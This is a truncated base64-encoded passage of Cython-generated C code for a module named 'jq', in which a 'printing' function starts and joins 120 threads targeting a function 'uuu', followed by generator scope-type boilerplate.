lPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKnVudXNlZCk7IFxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMmpxXzIxcHJpbnRpbmcgPSB7InByaW50aW5nIiwgKFB5Q0Z1bmN0aW9uKV9fcHl4X3B3XzJqcV8yMXByaW50aW5nLCBNRVRIX05PQVJHUywgMH07XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJqcV8yMXByaW50aW5nKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICp1bnVzZWQpIHtcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJwcmludGluZyAod3JhcHBlcikiLCAwKTtcbiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19WQVJBUkdTKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTtcbiAgX19weXhfciA9IF9fcHl4X3BmXzJqcV8yMHByaW50aW5nKF9fcHl4X3NlbGYpO1xuXG4gIFxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMmpxXzIwcHJpbnRpbmcoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZikge1xuICBDWVRIT05fVU5VU0VEIGxvbmcgX19weXhfdl9pO1xuICBQeU9iamVjdCAqX19weXhfdl90ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBsb25nIF9fcHl4X3RfMTtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90XzY7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBpbnQgX19weXhfdF84O1xuICBQeV9zc2l6ZV90IF9fcHl4X3RfOTtcbiAgUHlPYmplY3QgKigqX19weXhfdF8xMCkoUHlPYmplY3QgKik7XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInByaW50aW5nIiwgMCk7XG5cbiAgXG4gIGZvciAoX19weXhfdF8xID0gMDsgX19weXhfdF8xIDwgMHg3ODsgX19weXhfdF8xKz0xKSB7XG4gICAgX19weXhfdl9pID0gX19weXhfdF8xO1xuXG4gICAgXG4gICAgX19weXhfdF8zID0gTlVMTDtcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RocmVhZGluZyk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQ2OCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9UaHJlYWQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0NjgsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXV1KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDY4LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICBfX3B5eF90XzYgPSAxO1xuICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF81KSkpIHtcbiAgICAgIF9fcHl4X3RfMyA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNSk7XG4gICAgICBhc3NlcnQoX19weXhfdF8zKTtcbiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF81KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzMpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNSwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fcHl4X3RfNiA9IDA7XG4gICAgfVxuICAgICNlbmRpZlxuICAgIHtcbiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyAxIDogMCldID0ge19fcHl4X3RfMywgTlVMTH07XG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0NjgsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90YXJnZXQsIF9fcHl4X3RfNCwgX19weXhfdF83LCBfX3B5eF9jYWxsYXJncysxLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ2OCwgX19weXhfTDFfZXJyb3IpXG4gICAgICBfX3B5eF90XzIgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgxLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfNyk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0NjgsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgfVxuICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfdCwgX19weXhfdF8yKTtcbiAgICBfX3B5eF90XzIgPSAwO1xuXG4gICAgXG4gICAgX19weXhfdF81ID0gX19weXhfdl90O1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpO1xuICAgIF9fcHl4X3RfNiA9IDA7XG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgTlVMTH07XG4gICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3RhcnQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDEtX19weXhfdF82KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDY5LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgIH1cbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICAgIFxuICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGhyZWFkcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQ3MCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfQXBwZW5kKF9fcHl4X3RfMiwgX19weXhfdl90KTsgaWYgKHVubGlrZWx5KF9fcHl4X3RfOCA9PSAoKGludCktMSkpKSBfX1BZWF9FUlIoMCwgNDcwLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgfVxuXG4gIFxuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RocmVhZHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0NzIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgaWYgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChfX3B5eF90XzIpKSB8fCBQeVR1cGxlX0NoZWNrRXhhY3QoX19weXhfdF8yKSkge1xuICAgIF9fcHl4X3RfNSA9IF9fcHl4X3RfMjsgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgX19weXhfdF85ID0gMDtcbiAgICBfX3B5eF90XzEwID0gTlVMTDtcbiAgfSBlbHNlIHtcbiAgICBfX3B5eF90XzkgPSAtMTsgX19weXhfdF81ID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF90XzIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0NzIsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgIF9fcHl4X3RfMTAgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgNDcyLCBfX3B5eF9MMV9lcnJvcilcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgZm9yICg7Oykge1xuICAgIGlmIChsaWtlbHkoIV9fcHl4X3RfMTApKSB7XG4gICAgICBpZiAobGlrZWx5KFB5TGlzdF9DaGVja0V4YWN0KF9fcHl4X3RfNSkpKSB7XG4gICAgICAgIHtcbiAgICAgICAgICBQeV9zc2l6ZV90IF9fcHl4X3RlbXAgPSBfX1B5eF9QeUxpc3RfR0VUX1NJWkUoX19weXhfdF81KTtcbiAgICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgICAgICAgaWYgKHVubGlrZWx5KChfX3B5eF90ZW1wIDwgMCkpKSBfX1BZWF9FUlIoMCwgNDcyLCBfX3B5eF9MMV9lcnJvcilcbiAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICBpZiAoX19weXhfdF85ID49IF9fcHl4X3RlbXApIGJyZWFrO1xuICAgICAgICB9XG4gICAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKF9fcHl4X3RfNSwgX19weXhfdF85KTtcbiAgICAgICAgKytfX3B5eF90Xzk7XG4gICAgICB9IGVsc2Uge1xuICAgICAgICB7XG4gICAgICAgICAgUHlfc3NpemVfdCBfX3B5eF90ZW1wID0gX19QeXhfUHlUdXBsZV9HRVRfU0laRShfX3B5eF90XzUpO1xuICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgICBpZiAodW5saWtlbHkoKF9fcHl4X3RlbXAgPCAwKSkpIF9fUFlYX0VSUigwLCA0NzIsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICAgICNlbmRpZlxuICAgICAgICAgIGlmIChfX3B5eF90XzkgPj0gX19weXhfdGVtcCkgYnJlYWs7XG4gICAgICAgIH1cbiAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X05ld1JlZihQeVR1cGxlX0dFVF9JVEVNKF9fcHl4X3RfNSwgX19weXhfdF85KSk7XG4gICAgICAgICNlbHNlXG4gICAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShfX3B5eF90XzUsIF9fcHl4X3RfOSk7XG4gICAgICAgICNlbmRpZlxuICAgICAgICArK19fcHl4X3RfOTtcbiAgICAgIH1cbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQ3MiwgX19weXhfTDFfZXJyb3IpXG4gICAgfSBlbHNlIHtcbiAgICAgIF9fcHl4X3RfMiA9IF9fcHl4X3RfMTAoX19weXhfdF81KTtcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkge1xuICAgICAgICBQeU9iamVjdCogZXhjX3R5cGUgPSBQeUVycl9PY2N1cnJlZCgpO1xuICAgICAgICBpZiAoZXhjX3R5cGUpIHtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhleGNfdHlwZSwgUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSBfX1BZWF9FUlIoMCwgNDcyLCBfX3B5eF9MMV9lcnJvcilcbiAgICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgICAgICB9XG4gICAgICAgIGJyZWFrO1xuICAgICAgfVxuICAgIH1cbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X3QsIF9fcHl4X3RfMik7XG4gICAgX19weXhfdF8yID0gMDtcblxuICAgIFxuICAgIF9fcHl4X3RfNyA9IF9fcHl4X3ZfdDtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTtcbiAgICBfX3B5eF90XzYgPSAwO1xuICAgIHtcbiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzcsIE5VTEx9O1xuICAgICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2pvaW4sIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDEtX19weXhfdF82KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDczLCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgIH1cbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICAgIFxuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuXG4gIFxuXG4gIFxuICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpO1xuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpO1xuICBfX1B5eF9BZGRUcmFjZWJhY2soImpxLnByaW50aW5nIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl90KTtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3RwX25ld18yanFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKFB5VHlwZU9iamVjdCAqdCwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqYSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqaykge1xuICBQeU9iamVjdCAqbztcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgYWxsb2NmdW5jIGFsbG9jX2Z1bmMgPSAoYWxsb2NmdW5jKVB5VHlwZV9HZXRTbG90KHQsIFB5X3RwX2FsbG9jKTtcbiAgbyA9IGFsbG9jX2Z1bmModCwgMCk7XG4gICNlbHNlXG4gICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuICBpZiAobGlrZWx5KChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8yanFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByID4gMCkgJiAoaW50KSh0LT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcikpKSkge1xuICAgIG8gPSAoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHJbLS1fX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcl07XG4gICAgbWVtc2V0KG8sIDAsIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpKTtcbiAgICAodm9pZCkgUHlPYmplY3RfSU5JVChvLCB0KTtcbiAgICBQeU9iamVjdF9HQ19UcmFjayhvKTtcbiAgfSBlbHNlXG4gICNlbmRpZlxuICB7XG4gICAgbyA9ICgqdC0+dHBfYWxsb2MpKHQsIDApO1xuICAgIGlmICh1bmxpa2VseSghbykpIHJldHVybiAwO1xuICB9XG4gICNlbmRpZlxuICByZXR1cm4gbztcbn1cblxuc3RhdGljIHZvaWQgX19weXhfdHBfZGVhbGxvY18yanFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKFB5T2JqZWN0ICpvKSB7XG4gIHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgKilvO1xuICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRVxuICBpZiAodW5saWtlbHkoKFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwMDAgfHwgX19QeXhfUHlUeXBlX0hhc0ZlYXR1cmUoUHlfVFlQRShvKSwgUHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFKSkgJiYgX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9maW5hbGl6ZSwgZGVzdHJ1Y3RvcikpICYmICFfX1B5eF9QeU9iamVjdF9HQ19Jc0ZpbmFsaXplZChvKSkge1xuICAgIGlmIChfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2RlYWxsb2MsIGRlc3RydWN0b3IpID09IF9fcHl4X3RwX2RlYWxsb2NfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcikge1xuICAgICAgaWYgKFB5T2JqZWN0X0NhbGxGaW5hbGl6ZXJGcm9tRGVhbGxvYyhvKSkgcmV0dXJuO1xuICAgIH1cbiAgfVxuICAjZW5kaWZcbiAgUHlPYmplY3RfR0NfVW5UcmFjayhvKTtcbiAgUHlfQ0xFQVIocC0+X19weXhfZ2VuZXhwcl9hcmdfMCk7XG4gIFB5X0NMRUFSKHAtPl9fcHl4X3ZfaSk7XG4gICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuICBpZiAoKChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8yanFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByIDwgOCkgJiAoaW50KShQeV9UWVBFKG8pLT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcikpKSkge1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHJbX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIrK10gPSAoKHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciAqKW8pO1xuICB9IGVsc2VcbiAgI2VuZGlmXG4gIHtcbiAgICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gICAgKCpQeV9UWVBFKG8pLT50cF9mcmVlKShvKTtcbiAgICAjZWxzZVxuICAgIHtcbiAgICAgIGZyZWVmdW5jIHRwX2ZyZWUgPSAoZnJlZWZ1bmMpUHlUeXBlX0dldFNsb3QoUHlfVFlQRShvKSwgUHlfdHBfZnJlZSk7XG4gICAgICBpZiAodHBfZnJlZSkgdHBfZnJlZShvKTtcbiAgICB9XG4gICAgI2VuZGlmXG4gIH1cbn1cblxuc3RhdGljIGludCBfX3B5eF90cF90cmF2ZXJzZV8yanFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKFB5T2JqZWN0ICpvLCB2aXNpdHByb2Mgdiwgdm9pZCAqYSkge1xuICBpbnQgZTtcbiAgc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciAqKW87XG4gIHtcbiAgICBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKG8sIDEsIHYsIGEpO1xuICAgIGlmIChlKSByZXR1cm4gZTtcbiAgfVxuICBpZiAocC0+X19weXhfZ2VuZXhwcl9hcmdfMCkge1xuICAgIGUgPSAoKnYpKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzAsIGEpOyBpZiAoZSkgcmV0dXJuIGU7XG4gIH1cbiAgaWYgKHAtPl9fcHl4X3ZfaSkge1xuICAgIGUgPSAoKnYpKHAtPl9fcHl4X3ZfaSwgYSk7IGlmIChlKSByZXR1cm4gZTtcbiAgfVxuICByZXR1cm4gMDtcbn1cbiNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbnN0YXRpYyBQeVR5cGVfU2xvdCBfX3B5eF90eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHJfc2xvdHNbXSA9IHtcbiAge1B5X3RwX2RlYWxsb2MsICh2b2lkICopX19weXhfdHBfZGVhbGxvY18yanFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByfSxcbiAge1B5X3RwX3RyYXZlcnNlLCAodm9pZCAqKV9fcHl4X3RwX3RyYXZlcnNlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHJ9LFxuICB7UHlfdHBfbmV3LCAodm9pZCAqKV9fcHl4X3RwX25ld18yanFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByfSxcbiAgezAsIDB9LFxufTtcbnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF90eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHJfc3BlYyA9IHtcbiAgImpxLl9fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciIsXG4gIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpLFxuICAwLFxuICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQ3xQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsXG4gIF9fcHl4X3R5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcl9zbG90cyxcbn07XG4jZWxzZVxuXG5zdGF0aWMgUHlUeXBlT2JqZWN0IF9fcHl4X3R5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciA9IHtcbiAgUHlWYXJPYmplY3RfSEVBRF9JTklUKDAsIDApXG4gICJqcS4iIl9fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciIsIFxuICBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKSwgXG4gIDAsIFxuICBfX3B5eF90cF9kZWFsbG9jXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIsIFxuICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDgwMGI0XG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjRcbiAgMCwgXG4gICNlbmRpZlxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0N8UHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFLCBcbiAgMCwgXG4gIF9fcHl4X3RwX3RyYXZlcnNlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAwLCBcbiAgI2VuZGlmXG4gIDAsIFxuICAwLCBcbiAgX19weXhfdHBfbmV3XzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRVxuICAwLCBcbiAgI2Vsc2Vc